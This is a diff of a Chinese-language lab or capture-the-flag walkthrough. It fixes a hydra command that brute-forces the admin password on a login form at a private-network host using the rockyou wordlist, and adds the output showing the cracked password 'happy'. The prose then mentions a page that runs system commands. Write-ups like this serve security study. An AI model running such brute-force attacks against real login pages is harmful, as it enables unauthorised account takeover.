@@ -40,7 +40,9 @@ http://192.168.5.29/command.php          (Status: 302) [Size: 704] [--> index.ph
 只有先尝试爆破一下登陆的页面了，看看能不能找到可用的用户凭据：
 
 ```
-hydra -t 20 -l admin -P ~/tools/dict/rockyou.txt 192.168.5.29 -f http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login"
+hydra -t 20 -l admin -P ~/tools/dict/rockyou.txt 192.168.5.29 -f http-post-form "/login.php:username=^USER^&password=^PASS^:302"
+
+[80][http-post-form] host: 192.168.5.29   login: admin   password: happy
 ```
 
 找到了 admin 的用户密码 happy, 进入系统后，发现 http://192.168.5.29/command.php 链接，有 3 个按钮，可以调用系统命令。
